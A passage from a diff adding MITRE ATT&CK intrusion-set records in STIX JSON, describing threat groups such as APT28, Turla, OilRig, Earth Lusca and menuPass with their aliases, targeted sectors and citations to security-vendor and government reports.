+          "source_name": "Sofacy DealersChoice",
+          "description": "Falcone, R. (2018, March 15). Sofacy Uses DealersChoice to Target European Government Agency. Retrieved June 4, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/03/unit42-sofacy-uses-dealerschoice-target-european-government-agency/"
+        },
+        {
+          "source_name": "FireEye APT28 January 2017",
+          "description": "FireEye iSIGHT Intelligence. (2017, January 11). APT28: At the Center of the Storm. Retrieved January 11, 2017.",
+          "url": "https://www2.fireeye.com/rs/848-DID-242/images/APT28-Center-of-Storm-2017.pdf"
+        },
+        {
+          "source_name": "FireEye APT28",
+          "description": "FireEye. (2015). APT28: A WINDOW INTO RUSSIA’S CYBER ESPIONAGE OPERATIONS?. Retrieved August 19, 2015.",
+          "url": "https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"
+        },
+        {
+          "source_name": "Ars Technica GRU indictment Jul 2018",
+          "description": "Gallagher, S. (2018, July 27). How they did it (and will likely try again): GRU hackers vs. US elections. Retrieved September 13, 2018.",
+          "url": "https://arstechnica.com/information-technology/2018/07/from-bitly-to-x-agent-how-gru-hackers-targeted-the-2016-presidential-election/"
+        },
+        {
+          "source_name": "TrendMicro Pawn Storm Dec 2020",
+          "description": "Hacquebord, F., Remorin, L. (2020, December 17). Pawn Storm’s Lack of Sophistication as a Strategy. Retrieved January 13, 2021.",
+          "url": "https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html"
+        },
+        {
+          "source_name": "Securelist Sofacy Feb 2018",
+          "description": "Kaspersky Lab's Global Research & Analysis Team. (2018, February 20). A Slice of 2017 Sofacy Activity. Retrieved November 27, 2018.",
+          "url": "https://securelist.com/a-slice-of-2017-sofacy-activity/83930/"
+        },
+        {
+          "source_name": "Kaspersky Sofacy",
+          "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015.",
+          "url": "https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/"
+        },
+        {
+          "source_name": "Palo Alto Sofacy 06-2018",
+          "description": "Lee, B., Falcone, R. (2018, June 06). Sofacy Group’s Parallel Attacks. Retrieved June 18, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/"
+        },
+        {
+          "source_name": "Talos Seduploader Oct 2017",
+          "description": "Mercer, W., et al. (2017, October 22). \"Cyber Conflict\" Decoy Document Used in Real Cyber Conflict. Retrieved November 2, 2018.",
+          "url": "https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html"
+        },
+        {
+          "source_name": "Microsoft STRONTIUM New Patterns Cred Harvesting Sept 2020",
+          "description": "Microsoft Threat Intelligence Center (MSTIC). (2020, September 10). STRONTIUM: Detecting new patterns in credential harvesting. Retrieved September 11, 2020.",
+          "url": "https://www.microsoft.com/security/blog/2020/09/10/strontium-detecting-new-patters-credential-harvesting/"
+        },
+        {
+          "source_name": "Microsoft STRONTIUM Aug 2019",
+          "description": "MSRC Team. (2019, August 5). Corporate IoT – a path to intrusion. Retrieved August 16, 2019.",
+          "url": "https://msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion/"
+        },
+        {
+          "source_name": "DOJ GRU Indictment Jul 2018",
+          "description": "Mueller, R. (2018, July 13). Indictment - United States of America vs. VIKTOR BORISOVICH NETYKSHO, et al. Retrieved September 13, 2018.",
+          "url": "https://www.justice.gov/file/1080281/download"
+        },
+        {
+          "source_name": "Cybersecurity Advisory GRU Brute Force Campaign July 2021",
+          "description": "NSA, CISA, FBI, NCSC. (2021, July). Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments. Retrieved July 26, 2021.",
+          "url": "https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
+        },
+        {
+          "source_name": "NSA/FBI Drovorub August 2020",
+          "description": "NSA/FBI. (2020, August). Russian GRU 85th GTsSS Deploys Previously Undisclosed Drovorub Malware. Retrieved August 25, 2020.",
+          "url": "https://media.defense.gov/2020/Aug/13/2002476465/-1/-1/0/CSA_DROVORUB_RUSSIAN_GRU_MALWARE_AUG_2020.PDF"
+        },
+        {
+          "source_name": "SecureWorks TG-4127",
+          "description": "SecureWorks Counter Threat Unit Threat Intelligence. (2016, June 16). Threat Group-4127 Targets Hillary Clinton Presidential Campaign. Retrieved August 3, 2016.",
+          "url": "https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign"
+        },
+        {
+          "source_name": "Secureworks IRON TWILIGHT Active Measures March 2017",
+          "description": "Secureworks CTU. (2017, March 30). IRON TWILIGHT Supports Active Measures. Retrieved February 28, 2022.",
+          "url": "https://www.secureworks.com/research/iron-twilight-supports-active-measures"
+        },
+        {
+          "source_name": "Secureworks IRON TWILIGHT Profile",
+          "description": "Secureworks CTU. (n.d.). IRON TWILIGHT. Retrieved February 28, 2022.",
+          "url": "https://www.secureworks.com/research/threat-profiles/iron-twilight"
+        },
+        {
+          "source_name": "Symantec APT28 Oct 2018",
+          "description": "Symantec Security Response. (2018, October 04). APT28: New Espionage Operations Target Military and Government Organizations. Retrieved November 14, 2018.",
+          "url": "https://www.symantec.com/blogs/election-security/apt28-espionage-military-government"
+        },
+        {
+          "source_name": "Sednit",
+          "description": "This designation has been used in reporting both to refer to the threat group and its associated malware [JHUHUGIT](https://attack.mitre.org/software/S0044).(Citation: FireEye APT28 January 2017)(Citation: SecureWorks TG-4127)(Citation: Kaspersky Sofacy)(Citation: Ars Technica GRU indictment Jul 2018)"
+        },
+        {
+          "source_name": "Sofacy",
+          "description": "This designation has been used in reporting both to refer to the threat group and its associated malware.(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: Crowdstrike DNC June 2016)(Citation: ESET Sednit Part 3)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Talos Seduploader Oct 2017)"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "mobile-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T05:41:28.428Z",
+      "name": "Turla",
+      "description": "[Turla](https://attack.mitre.org/groups/G0010) is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015. [Turla](https://attack.mitre.org/groups/G0010) is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. [Turla](https://attack.mitre.org/groups/G0010)’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.(Citation: Kaspersky Turla)(Citation: ESET Gazer Aug 2017)(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla Mosquito Jan 2018)",
+      "aliases": [
+        "Turla",
+        "IRON HUNTER",
+        "Group 88",
+        "Belugasturgeon",
+        "Waterbug",
+        "WhiteBear",
+        "Snake",
+        "Krypton",
+        "Venomous Bear"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "3.1",
+      "x_mitre_contributors": [
+        "Matthieu Faou, ESET",
+        "Edward Millington"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--7a19ecb1-3c65-4de3-a230-993516aed6a6",
+      "created": "2017-05-31T21:31:49.816Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0010",
+          "external_id": "G0010"
+        },
+        {
+          "source_name": "Belugasturgeon",
+          "description": "(Citation: Accenture HyperStack October 2020)"
+        },
+        {
+          "source_name": "Krypton",
+          "description": "(Citation: CrowdStrike VENOMOUS BEAR)"
+        },
+        {
+          "source_name": "Snake",
+          "description": "(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla PowerShell May 2019)(Citation: Talos TinyTurla September 2021)"
+        },
+        {
+          "source_name": "Venomous Bear",
+          "description": "(Citation: CrowdStrike VENOMOUS BEAR)(Citation: Talos TinyTurla September 2021)"
+        },
+        {
+          "source_name": "Turla",
+          "description": "(Citation: Kaspersky Turla)"
+        },
+        {
+          "source_name": "Group 88",
+          "description": "(Citation: Leonardo Turla Penquin May 2020)"
+        },
+        {
+          "source_name": "IRON HUNTER",
+          "description": "(Citation: Secureworks IRON HUNTER Profile)"
+        },
+        {
+          "source_name": "Accenture HyperStack October 2020",
+          "description": "Accenture. (2020, October). Turla uses HyperStack, Carbon, and Kazuar to compromise government entity. Retrieved December 2, 2020.",
+          "url": "https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity"
+        },
+        {
+          "source_name": "Waterbug",
+          "description": "Based similarity in TTPs and malware used, Turla and Waterbug appear to be the same group.(Citation: Symantec Waterbug)"
+        },
+        {
+          "source_name": "Talos TinyTurla September 2021",
+          "description": "Cisco Talos. (2021, September 21). TinyTurla - Turla deploys new malware to keep a secret backdoor on victim machines. Retrieved December 2, 2021.",
+          "url": "https://blog.talosintelligence.com/2021/09/tinyturla.html"
+        },
+        {
+          "source_name": "ESET Turla Mosquito Jan 2018",
+          "description": "ESET, et al. (2018, January). Diplomats in Eastern Europe bitten by a Turla mosquito. Retrieved July 3, 2018.",
+          "url": "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
+        },
+        {
+          "source_name": "ESET Gazer Aug 2017",
+          "description": "ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",
+          "url": "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf"
+        },
+        {
+          "source_name": "ESET Turla PowerShell May 2019",
+          "description": "Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.",
+          "url": "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/"
+        },
+        {
+          "source_name": "Securelist WhiteBear Aug 2017",
+          "description": "Kaspersky Lab's Global Research & Analysis Team. (2017, August 30). Introducing WhiteBear. Retrieved September 21, 2017.",
+          "url": "https://securelist.com/introducing-whitebear/81638/"
+        },
+        {
+          "source_name": "Kaspersky Turla",
+          "description": "Kaspersky Lab's Global Research and Analysis Team. (2014, August 7). The Epic Turla Operation: Solving some of the mysteries of Snake/Uroburos. Retrieved December 11, 2014.",
+          "url": "https://securelist.com/the-epic-turla-operation/65545/"
+        },
+        {
+          "source_name": "Leonardo Turla Penquin May 2020",
+          "description": "Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA “Penquin_x64”. Retrieved March 11, 2021.",
+          "url": "https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf"
+        },
+        {
+          "source_name": "CrowdStrike VENOMOUS BEAR",
+          "description": "Meyers, A. (2018, March 12). Meet CrowdStrike’s Adversary of the Month for March: VENOMOUS BEAR. Retrieved May 16, 2018.",
+          "url": "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-march-venomous-bear/"
+        },
+        {
+          "source_name": "Secureworks IRON HUNTER Profile",
+          "description": "Secureworks CTU. (n.d.). IRON HUNTER. Retrieved February 22, 2022.",
+          "url": "http://www.secureworks.com/research/threat-profiles/iron-hunter"
+        },
+        {
+          "source_name": "Symantec Waterbug",
+          "description": "Symantec. (2015, January 26). The Waterbug attack group. Retrieved April 10, 2015.",
+          "url": "https://www.threatminer.org/report.php?q=waterbug-attack-group.pdf&y=2015#gsc.tab=0&gsc.q=waterbug-attack-group.pdf&gsc.page=1"
+        },
+        {
+          "source_name": "WhiteBear",
+          "description": "WhiteBear is a designation used by Securelist to describe a cluster of activity that has overlaps with activity described by others as Turla, but appears to have a separate focus.(Citation: Securelist WhiteBear Aug 2017)(Citation: Talos TinyTurla September 2021)"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2020-03-30T19:15:49.217Z",
+      "name": "Rancor",
+      "description": "[Rancor](https://attack.mitre.org/groups/G0075) is a threat group that has led targeted campaigns against the South East Asia region. [Rancor](https://attack.mitre.org/groups/G0075) uses politically-motivated lures to entice victims to open malicious documents. (Citation: Rancor Unit42 June 2018)",
+      "x_mitre_version": "1.2",
+      "aliases": [
+        "Rancor"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "intrusion-set--f40eb8ce-2a74-4e56-89a1-227021410142",
+      "type": "intrusion-set",
+      "created": "2018-10-17T00:14:20.652Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0075",
+          "external_id": "G0075"
+        },
+        {
+          "source_name": "Rancor",
+          "description": "(Citation: Rancor Unit42 June 2018)"
+        },
+        {
+          "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/",
+          "description": "Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018.",
+          "source_name": "Rancor Unit42 June 2018"
+        }
+      ],
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2022-10-17T19:51:56.531Z",
+      "name": "Earth Lusca",
+      "description": "[Earth Lusca](https://attack.mitre.org/groups/G1006) is a suspected China-based cyber espionage group that has been active since at least April 2019. [Earth Lusca](https://attack.mitre.org/groups/G1006) has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some [Earth Lusca](https://attack.mitre.org/groups/G1006) operations may be financially motivated.(Citation: TrendMicro EarthLusca 2022)\n\n[Earth Lusca](https://attack.mitre.org/groups/G1006) has used malware commonly used by other Chinese threat groups, including [APT41](https://attack.mitre.org/groups/G0096) and the [Winnti Group](https://attack.mitre.org/groups/G0044) cluster, however security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006)'s techniques and infrastructure are separate.(Citation: TrendMicro EarthLusca 2022)",
+      "aliases": [
+        "Earth Lusca",
+        "TAG-22"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.0",
+      "type": "intrusion-set",
+      "id": "intrusion-set--cc613a49-9bfa-4e22-98d1-15ffbb03f034",
+      "created": "2022-07-01T20:12:30.184Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G1006",
+          "external_id": "G1006"
+        },
+        {
+          "source_name": "TAG-22",
+          "description": "(Citation: Recorded Future TAG-22 July 2021)"
+        },
+        {
+          "source_name": "TrendMicro EarthLusca 2022",
+          "description": "Chen, J., et al. (2022). Delving Deep: An Analysis of Earth Lusca’s Operations. Retrieved July 1, 2022.",
+          "url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+        },
+        {
+          "source_name": "Recorded Future TAG-22 July 2021",
+          "description": "INSIKT GROUP. (2021, July 8). Chinese State-Sponsored Activity Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Other Tooling. Retrieved September 2, 2022.",
+          "url": "https://www.recordedfuture.com/chinese-group-tag-22-targets-nepal-philippines-taiwan"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "mobile-attack"
+      ],
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-02-06T20:58:52.317Z",
+      "name": "OilRig",
+      "description": "[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.(Citation: Palo Alto OilRig April 2017)(Citation: ClearSky OilRig Jan 2017)(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: Unit42 OilRig Playbook 2023)(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018)",
+      "aliases": [
+        "OilRig",
+        "COBALT GYPSY",
+        "IRN2",
+        "APT34",
+        "Helix Kitten",
+        "Evasive Serpens"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "3.1",
+      "x_mitre_contributors": [
+        "Robert Falcone",
+        "Bryan Lee",
+        "Dragos  Threat  Intelligence"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d",
+      "created": "2017-12-14T16:46:06.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0049",
+          "external_id": "G0049"
+        },
+        {
+          "source_name": "IRN2",
+          "description": "(Citation: Crowdstrike Helix Kitten Nov 2018)"
+        },
+        {
+          "source_name": "OilRig",
+          "description": "(Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: Unit 42 QUADAGENT July 2018)"
+        },
+        {
+          "source_name": "COBALT GYPSY",
+          "description": "(Citation: Secureworks COBALT GYPSY Threat Profile)"
+        },
+        {
+          "source_name": "Helix Kitten",
+          "description": "(Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018)"
+        },
+        {
+          "source_name": "Evasive Serpens",
+          "description": "(Citation: Unit42 OilRig Playbook 2023)"
+        },
+        {
+          "source_name": "Check Point APT34 April 2021",
+          "description": "Check Point. (2021, April 8). Iran’s APT34 Returns with an Updated Arsenal. Retrieved May 5, 2021.",
+          "url": "https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/"
+        },
+        {
+          "source_name": "ClearSky OilRig Jan 2017",
+          "description": "ClearSky Cybersecurity. (2017, January 5). Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford. Retrieved May 3, 2017.",
+          "url": "http://www.clearskysec.com/oilrig/"
+        },
+        {
+          "source_name": "Palo Alto OilRig May 2016",
+          "description": "Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017.",
+          "url": "http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"
+        },
+        {
+          "source_name": "Palo Alto OilRig April 2017",
+          "description": "Falcone, R.. (2017, April 27). OilRig Actors Provide a Glimpse into Development and Testing Efforts. Retrieved May 3, 2017.",
+          "url": "http://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/"
+        },
+        {
+          "source_name": "Palo Alto OilRig Oct 2016",
+          "description": "Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.",
+          "url": "http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"
+        },
+        {
+          "source_name": "Unit 42 QUADAGENT July 2018",
+          "description": "Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/"
+        },
+        {
+          "source_name": "Crowdstrike Helix Kitten Nov 2018",
+          "description": "Meyers, A. (2018, November 27). Meet CrowdStrike’s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018.",
+          "url": "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/"
+        },
+        {
+          "source_name": "FireEye APT34 Dec 2017",
+          "description": "Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
+        },
+        {
+          "source_name": "Secureworks COBALT GYPSY Threat Profile",
+          "description": "Secureworks. (n.d.). COBALT GYPSY Threat Profile. Retrieved April 14, 2021.",
+          "url": "https://www.secureworks.com/research/threat-profiles/cobalt-gypsy"
+        },
+        {
+          "source_name": "APT34",
+          "description": "This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.(Citation: Unit 42 QUADAGENT July 2018)(Citation: FireEye APT34 Dec 2017)(Citation: Check Point APT34 April 2021)"
+        },
+        {
+          "source_name": "Unit 42 Playbook Dec 2017",
+          "description": "Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017.",
+          "url": "https://pan-unit42.github.io/playbook_viewer/"
+        },
+        {
+          "source_name": "Unit42 OilRig Playbook 2023",
+          "description": "Unit42. (2016, May 1). Evasive Serpens Unit 42 Playbook Viewer. Retrieved February 6, 2023.",
+          "url": "https://pan-unit42.github.io/playbook_viewer/?pb=evasive-serpens"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "ics-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2021-04-22T02:12:43.892Z",
+      "name": "Higaisa",
+      "description": "[Higaisa](https://attack.mitre.org/groups/G0126) is a threat group suspected to have South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. [Higaisa](https://attack.mitre.org/groups/G0126) was first disclosed in early 2019 but is assessed to have operated as early as 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
+      "x_mitre_version": "1.0",
+      "aliases": [
+        "Higaisa"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "Daniyal Naeem, BT Security"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
+      "type": "intrusion-set",
+      "created": "2021-03-05T18:54:56.267Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "G0126",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0126"
+        },
+        {
+          "source_name": "Malwarebytes Higaisa 2020",
+          "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
+          "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021."
+        },
+        {
+          "source_name": "Zscaler Higaisa 2020",
+          "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
+          "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021."
+        },
+        {
+          "source_name": "PTSecurity Higaisa 2020",
+          "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
+          "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021."
+        }
+      ],
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-23T15:06:31.019Z",
+      "name": "menuPass",
+      "description": "[menuPass](https://attack.mitre.org/groups/G0045) is a threat group that has been active since at least 2006. Individual members of [menuPass](https://attack.mitre.org/groups/G0045) are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)\n\n[menuPass](https://attack.mitre.org/groups/G0045) has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.(Citation: Palo Alto menuPass Feb 2017)(Citation: Crowdstrike CrowdCast Oct 2013)(Citation: FireEye Poison Ivy)(Citation: PWC Cloud Hopper April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)",
+      "aliases": [
+        "menuPass",
+        "Cicada",
+        "POTASSIUM",
+        "Stone Panda",
+        "APT10",
+        "Red Apollo",
+        "CVNX",
+        "HOGFISH"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Edward Millington",
+        "Michael Cox"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--222fbd21-fc4f-4b7e-9f85-0e6e3a76c33f",
+      "created": "2017-05-31T21:32:09.054Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0045",
+          "external_id": "G0045"
+        },
+        {
+          "source_name": "HOGFISH",
+          "description": "(Citation: Accenture Hogfish April 2018)"
+        },
+        {
+          "source_name": "POTASSIUM",
+          "description": "(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)"
+        },
+        {
+          "source_name": "Stone Panda",
+          "description": "(Citation: Palo Alto menuPass Feb 2017)(Citation: Accenture Hogfish April 2018)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)(Citation: Symantec Cicada November 2020)"
+        },
+        {
+          "source_name": "APT10",
+          "description": "(Citation: Palo Alto menuPass Feb 2017)(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)(Citation: DOJ APT10 Dec 2018)(Citation: Symantec Cicada November 2020)"
+        },
+        {
+          "source_name": "menuPass",
+          "description": "(Citation: Palo Alto menuPass Feb 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)"
+        },
+        {
+          "source_name": "Red Apollo",
+          "description": "(Citation: PWC Cloud Hopper April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)"
+        },
+        {
+          "source_name": "CVNX",
+          "description": "(Citation: PWC Cloud Hopper April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court of NY APT10 Indictment December 2018)"
+        },
+        {
+          "source_name": "Cicada",
+          "description": "(Citation: Symantec Cicada November 2020)"
+        },
+        {
+          "source_name": "Accenture Hogfish April 2018",
+          "description": "Accenture Security. (2018, April 23). Hogfish Redleaves Campaign. Retrieved July 2, 2018.",
+          "url": "http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf"
+        },
+        {
+          "source_name": "Crowdstrike CrowdCast Oct 2013",
+          "description": "Crowdstrike. (2013, October 16). CrowdCasts Monthly: You Have an Adversary Problem. Retrieved March 1, 2017.",
+          "url": "https://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"
+        },
+        {
+          "source_name": "FireEye APT10 April 2017",
+          "description": "FireEye iSIGHT Intelligence. (2017, April 6). APT10 (MenuPass Group): New Tools, Global Campaign Latest Manifestation of Longstanding Threat. Retrieved June 29, 2017.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html"
+        },
+        {
+          "source_name": "FireEye Poison Ivy",
